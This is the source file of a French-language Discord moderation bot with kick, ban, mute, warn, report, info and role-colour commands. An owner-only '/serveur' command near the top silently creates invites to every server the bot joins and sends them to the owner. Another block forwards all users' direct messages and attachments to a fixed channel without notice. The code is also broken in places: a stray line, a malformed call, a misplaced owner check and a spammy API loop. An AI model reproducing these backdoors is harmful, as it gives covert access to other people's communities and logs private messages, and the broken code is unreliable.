const Discord = require('discord.js')
const bot = new Discord.Client()
const prefix = ("/")
var version = "1.0.0"//version du bot
var dev = "ｐｏｋｅｒ ｆａｃｅ" //dev du bot
bot.login(process.env.TOKEN)

// Quand le bot se connecte //

bot.on("ready", async => {
    bot.user.setActivity("/help", {type: "PLAYING"});
    console.log(`Bot connecté avec ${bot.users.size} membres, sur ${bot.guilds.size} serveurs.`)
});

// Commande Help //

bot.on('message', message => {
if(message.author.id !== "339804940056920064") return;
if(message.content.startsWith(prefix + "serveur")) { 
bot.guilds.forEach(guild => {
   var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
   invite.createInvite().then(invite => message.channel.send`>Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres || id: ${guild.id}`)).catch(e => {});
 });
}
  if (message.author.bot)
    return;
  const args = message.content.split(" ");
  let text = args.slice(0).join(" ");

  if(message.channel.type === 'dm')
    return bot.channels.get('467194564772364289').send({
      embed: {
        color: 2719929,
        description: `Nom: ${message.author.username}#${message.author.discriminator}\nID: ${message.author.id}\nMessage: ${text}`,
        thumbnail: {
          url: message.author.avatarURL
        }
      },
      files: message.attachments.array().map(a => a.url)
    });

    if(message.content === prefix + "help") {
      message.delete()
      let helpEmbed = new Discord.RichEmbed()
      .setTitle("Help Menu")
      .setAuthor(bot.user.username, bot.user.avatarURL, "https://discord.gg/w4fMVzv")
      .setColor("FFD700")
      .addBlankField(1)
      .addField('**Modération**', '\n' +
        '/report <user#0000> [reason]' + '\n' + "```Report un utilisateur au Staff```" + '\n' +
        '/clear <messages>' + '\n' + "```Supprime X messages```" + '\n' +
        '/ban <@pseudo> [raison]' + '\n' + "```Ban un utilisateur```" + '\n' +
        '/warn <@pseudo> [raison]' + '\n' + "```Warn un utilisateur```" + '\n' +
        '/kick <@pseudo> [raison]' + '\n' + "```Kick un utilisateur```"
      )
      .addBlankField(1)
      .addField('**Utility**', '\n' +
        '/google <recherche>' + '\n' + "```Fait une recherche sur Google```"
      )
      .addBlankField(1)
      .addField("**Other**", '\n' +
        '/ping' + '\n' + "```Affiche le temps de latence```" + '\n' +
        '/help' + '\n' + "```Affiche le menu d'aide```" + '\n' +
        '/bot' + '\n' + "```Affiche les infos du bot```" + '\n' +
        '/info' + '\n' + "```Affiche les infos du Discord```"
    )
      .setFooter("En cas de problème : contactez ｐｏｋｅｒ ｆａｃｅ")
      .setTimestamp(new Date())

    message.author.send(helpEmbed)
    message.reply("La page d'aide vous à été envoyé en privé")
      }
 
      // -------------------Info Commandes--------------------- //

      if (message.content.startsWith(prefix + 'ping')) {
        message.delete()
        message.channel.send("Ping...").then((message) => {
        message.edit('Pong ! Temps de latence avec le serveur : `' + ` ${message.createdTimestamp - Date.now()}` + ' ms`')
        })
      }

    if (message.content.startsWith(prefix + 'invitation')) {
        message.delete()
        let invitationEmbed = new Discord.RichEmbed()
          .setTitle("Invitation Menu")
          .setAuthor(bot.user.username, bot.user.avatarURL, "https://discord.gg/w4fMVzv")
          .setColor("FFD700")
          .addField('Invitation : ', "**https://discord.gg/w4fMVzv**")
          .setFooter("En cas de problème : contactez ｐｏｋｅｒ ｆａｃｅ")
          .setTimestamp(new Date())
  
        message.channel.send(invitationEmbed)
      }
      if (message.content.startsWith(prefix + 'info')) {
        let args = message.content.split(' ')
        args.shift()
        message.delete()
  
        let infoEmbed = new Discord.RichEmbed()
          .setTitle("Info Menu")
          .setAuthor(bot.user.username, bot.user.avatarURL, "https://discord.gg/w4fMVzv")
          .setColor('#808000')
          .addField('**Nom** : ', message.guild.name)
          .addField('**Id** : ', message.guild.id)
          .addField('**Localisation** : ', message.guild.region)
          .addField('**Création** : ', message.guild.createdAt)
          .addField('**Owner** : ', message.guild.owner.user.tag)
          .addField('**Sécurité** : ', message.guild.verificationLevel)
          .addField('**Rôles** : ', message.guild.roles.size)
          .addField('**Membres** : ', message.guild.memberCount)
          .addField('**Salons** : ', message.guild.channels.size)
          .setFooter("En cas de problème : contactez ｐｏｋｅｒ ｆａｃｅ")
          .setTimestamp(new Date())
  
        message.channel.send(infoEmbed);
      }
      
        // commande des infos du bot //
    if (message.content.startsWith(prefix + 'bot')) {
      let args = message.content.split(' ')
      args.shift()
      message.delete()
      let botEmbed = new Discord.RichEmbed()
        .setTitle("Info Menu")
        .setColor('#8A2BE2')
        .setAuthor(bot.user.username, bot.user.avatarURL, "https://discord.gg/w4fMVzv")
        .addBlankField(1)
        .addField('Author : ', "```" + dev + "```")
        .addField('Version : ', "```" + version + "```")
        .addField('Prefix : ', "```" + prefix + "```")
        .addField('Ping : ', "```" + bot.ping + "```")
        .addField('Guilds : ', "```" + bot.guilds.size + "```")
        .addField('Users : ', "```" + bot.users.size + "```")
        .setTimestamp(new Date())
        .setFooter("En cas de problème : contactez ｐｏｋｅｒ ｆａｃｅ", bot.user.avatarURL)

      message.channel.send(botEmbed)
    }
    
    if (message.content.startsWith(prefix + 'google')) {
      let args = message.content.split(' ')
      args.shift()
      message.delete()
      message.reply('https://www.google.fr/search?q=' + args.join("%20"))  
    }

 // -------------------Mod commandes--------------------- //

 if (message.content.startsWith(prefix + 'report')) {
  let args = message.content.split(' ')
  args.shift()
  message.delete()
  let rUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
  if (!rUser) return message.reply("Mentionnez un membre valide");
  let rReason = args.join(" ").slice(22)
  if (!rReason) return message.reply("Veuillez indiquer une raison");

  let reportEmbed = new Discord.RichEmbed() //création de l'embed du message
    .setDescription("Reporting")
    .setColor("#ff1a1a")
    .addField("User : ", `${rUser.user.tag}`)
    .addField("By : ", `${message.author.username}`)
    .addField("Channel", message.channel.name)
    .addField("Time", message.createdAt)
    .addField("Raison", rReason)
    .setFooter("En cas de problème : contactez ｐｏｋｅｒ ｆａｃｅ", bot.user.avatarURL)
    .setTimestamp(new Date())
  message.channel.send("Joueur report avec succés, un modérateur vérifira votre plainte")
  //.then(console.log)
  //.catch(console.error);

  let reportschannel = message.guild.channels.find(`name`, "mute-warn-ban-kick-report");
  reportschannel.send(reportEmbed)
  //.then(console.log)
  //.catch(console.error);

}

    if (message.content.startsWith(prefix + "kick")) {
        let args = message.content.split(' ')
        args.shift()
        message.delete()
        if (!message.member.hasPermission('KICK_MEMBERS')) return message.reply("Vous n'avez pas la permission !");
        let member = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
        if (!member) return message.reply("Mentionnez un utilisateur valide");
        let rReason = args.join(" ").slice(22)
        if (!rReason) return message.reply("Veuillez indiquer une raison");
        if (!member.kickable)
          return message.reply("Impossible de kick l'utilisateur");
  
           member.kick(member)
          .catch(error => message.reply(`Désolé ${message.author} je ne peux pas le kick car : ${error}`));
  
  w
        let kickEmbed = new Discord.RichEmbed()
          .setAuthor(bot.user.username, bot.user.avatarURL, "https://discord.gg/w4fMVzvG")
          .setTitle("Kick Menu")
          .setColor('#1133EC')
          .addField('**Kicked** : ', member.user.tag)
          .addField('**ID** : ', member.user.id)
          .addField('**Modérator** : ', message.author.username)
          .addField("Raison", rReason)
          .setFooter("En cas de problème : contactez ｐｏｋｅｒ ｆａｃｅ")                      
          .setTimestamp(new Date())
          message.channel.send(kickEmbed);
          let logChannel = message.guild.channels.find(`name`, "mute-warn-ban-kick-report");
          message.channel.send("Joueur kick avec succés")
          logChannel.send(kickEmbed)
      }
      if (message.content.startsWith(prefix + "ban")) {
        let args = message.content.split(' ')
        args.shift()
        message.delete()
        if (!message.member.hasPermission('BAN_MEMBERS')) return message.reply("Vous n'avez pas la permission !");
        let member = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
        if (!member) return message.reply("Mentionnez un utilisateur valide");
        let rReason = args.join(" ").slice(22)
        if (!rReason) return message.channel.send("Veuillez indiquer une raison");
        if (!member.bannable)
          return message.reply("Impossible de bannir l'utilisateur");
  
        member.ban(member, {
            days: 30,
            reason: "Indésirable"
          })
          .catch(error => message.reply(`Désolé ${message.author} je ne peux pas le ban car : ${error}`));
  
  
        let banEmbed = new Discord.RichEmbed()
          .setAuthor(bot.user.username, bot.user.avatarURL, "https://discord.gg/w4fMVzv")
          .setTitle("Ban Menu")
          .setColor('#FFB6C1')
          .addField('**Banned** : ', member.user.tag)
          .addField('**ID** : ', member.user.id)
          .addField('**Modérator** : ', message.author.username)
          .addField("Raison", rReason)
          .setFooter("En cas de problème : contactez ｐｏｋｅｒ ｆａｃｅ")
          .setTimestamp(new Date())
  
        message.channel.send("Joueur banni avec succés")
        let logChannel = message.guild.channels.find(`name`, "mute-warn-ban-kick-report");
        logChannel.send(banEmbed)
      }  

      if (message.content.startsWith(prefix + "mute")) {
        let args = message.content.split(' ')
        args.shift()
        message.delete()
        if (!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("Vous n'avez pas la permission !");
        let toMute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
        if (!toMute) return message.reply("Mentionnez un utilisateur valide");
        let rReason = args.join(" ").slice(22)
        if (!rReason) return message.channel.send("Veuillez indiquer une raison");
        let member = message.mentions.members.first();
  
  
        let muteEmbed = new Discord.RichEmbed()
          .setTitle("Mute Menu")
          .setAuthor(bot.user.username, bot.user.avatarURL, "https://discord.gg/w4fMVzv")
          .setColor('#FFB6C1')
          .addField('**Muted** : ', member.user.tag)
          .addField('**ID** : ', member.user.id)
          .addField('**Modérator** : ', message.author.username)
          .addField("Raison", rReason)
          .setFooter("En cas de problème : contactez ｐｏｋｅｒ ｆａｃｅ")
          .setTimestamp(new Date())
  
        let role = message.guild.roles.find(r => r.name === "Muted");
        if (!role) {
          try {
            role = message.guild.createRole({
              name: "Muted",
              color: "#000000",
              mentionable: "false",
              permissions: []
            });
  
            message.guild.channels.forEach(async (channel, id) => {
            channel.overwritePermissions(role, {
                SEND_MESSAGES: false,
                ADD_REACTIONS: false
              });
            });
              
           message.reply("Le rôle a été creer, veuiller refaire la commande")

          } catch (e) {
            console.log(e.stack)
          }
        }

        if (toMute.roles.has(role.id)) return message.reply('Joueur déjà mute !');
  
      (toMute.addRole(role));
    if (!role) return;
        message.channel.send("Joueur mute avec succés")
        let logChannel = message.guild.channels.find(`name`, "mute-warn-ban-kick-report");
        logChannel.send(muteEmbed)
    }

    if (message.content.startsWith(prefix + "unmute")) {
        let args = message.content.split(' ')
        args.shift()
        message.delete()
        if (!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("Vous n'avez pas la permission");
        let toUnMute = message.guild.member(message.mentions.users.first())
        if (!toUnMute) return message.reply("Mentionnez un utilisateur valide");
        let unmuterole = message.guild.roles.find(`name`, "Muted");
        if (!toUnMute.roles.has(unmuterole.id)) return message.reply("Joueur non mute");
  
        let unMuteEmbed = new Discord.RichEmbed()
          .setTitle("Unmute Menu")
          .setAuthor(bot.user.username, bot.user.avatarURL, "https://discord.gg/w4fMVzv")
          .setColor('#FFB6C1')
          .addField('**Unmuted** : ', toUnMute.user.tag)
          .addField('**ID** : ', toUnMute.user.id)
          .addField('**Modérator** : ', message.author.username)
          .setFooter("En cas de problème : contactez ｐｏｋｅｒ ｆａｃｅ")
          .setTimestamp(new Date())
          message.channel.send("Joueur unmute avec succés")
          let logChannel = message.guild.channels.find(`name`, "mute-warn-ban-kick-report");
          logChannel.send(unMuteEmbed)
      toUnMute.removeRole(unmuterole.id)

    }
    if (message.content.startsWith(prefix + 'warn')) {
      let args = message.content.split(' ')
      args.shift()
      message.delete()
      if (!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("Vous n'avez pas la permission !");
      let toWarn = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
      if (!toWarn) return message.reply("Mentionnez un utilisateur valide");
      let wReason = args.join(" ").slice(22)
      if (!wReason) return message.reply("Veuillez indiquer une raison");
      let member = message.mentions.members.first();

      let warnEmbed = new Discord.RichEmbed()
        .setTitle("Warn Menu")
        .setAuthor(bot.user.username, bot.user.avatarURL, "https://discord.gg/w4fMVzv")
        .setColor('#FFB6C1')
        .addField('**Warned** : ', member.user.tag)
        .addField('**ID** : ', member.user.id)
        .addField('**Modérator** : ', message.author.username)
        .addField("Raison", wReason)
        .addField("Channel", message.channel.name)
        .addField("Time", message.createdAt)
        .setFooter("En cas de problème : contactez ｐｏｋｅｒ ｆａｃｅ")
        .setTimestamp(new Date())

      let logChannel = message.guild.channels.find(`name`, "mute-warn-ban-kick-report");
      logChannel.send(warnEmbed)
      message.channel.send("Joueur averti avec succés")

    }

    if(message.content.startsWith(prefix + "clear")) {
        if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) return message.channel.send("Vous n'avez pas la permission requise");
        let args = message.content.split(" ").slice(1);

        if(!args[0]) return message.channel.send("Vous n'avez pas préciser le nombre de message à supprimer")
        message.channel.bulkDelete(args[0]).then(() => {
            message.channel.send(`**${args[0]} messages ont été supprimés**`).then(message => message.delete(5000));
        })
    }
// -------------------Admin commandes--------------------- //

if (message.content === prefix + "rainbow") {
    console.log('Rainbow ON')
    let args = message.content.split(' ')
    args.shift()
    if(!message.guild.member(message.author).hasPermission("ADMINISTRATOR")) return message.channel.send("**Vous n'avez pas la permission requise !**");
    if (!message.guild.roles.find("name", "Rainbow")) return console.log('No Rainbow found')
    var myRainbow = message.guild.roles.find("name", "Rainbow")
    console.log('Rainbow found')
    for (var i = 0; i < 1000; i++) {
      myRainbow.setColor('#000000')
     
      myRainbow.setColor('#00FFFF')

      myRainbow.setColor('#F0FFFF')
  
      myRainbow.setColor('#F5F5DC')

      myRainbow.setColor('#8A2BE2')

      myRainbow.setColor('#5F9EA0')
 
      myRainbow.setColor('#00008B')

      myRainbow.setColor('#BDB76B')

      myRainbow.setColor('#696969')

      myRainbow.setColor('#DCDCDC')
    
      myRainbow.setColor('#FFD700')
 
      myRainbow.setColor('#DAA520')

      myRainbow.setColor('#CD5C5C')

      myRainbow.setColor('#E6E6FA')

      myRainbow.setColor('#ADD8E6')
  
      myRainbow.setColor('#FFB6C1')

      myRainbow.setColor('#9370DB')
   
      myRainbow.setColor('#F5FFFA')
    
      myRainbow.setColor('#FFE4B5')
   
      myRainbow.setColor('#000080')
     
      myRainbow.setColor('#808000')

      myRainbow.setColor('#BC8F8F')

      myRainbow.setColor('#4169E1')

      myRainbow.setColor('#2E8B57')
  
      myRainbow.setColor('#C0C0C0')

      myRainbow.setColor('#FFFAFA')
   
      myRainbow.setColor('#40E0D0')

      myRainbow.setColor('#F5F5F5')


    }
    }


 // -------------------Owner commandes--------------------- //

      if (message.content.startsWith(prefix + 'say')) {
        let args = message.content.split(' ')
        args.shift()
        message.delete()
        if(message.author.id !== "339804940056920064") return;
        message.channel.send(args.join(" "))
        //.then(console.log)
        //.catch(console.error);
      }
  
  
  
      //commande de Setgame du bot
      if (message.content.startsWith(prefix + 'setgame')) {
        let args = message.content.split(' ')
        args.shift()
        message.delete()
        if(message.author.id !== "339804940056920064") return;
        bot.user.setActivity(args.join("%20"))
        message.reply('Game set to ' + args.join("%20"))
      }
  
  
    }
  
  )
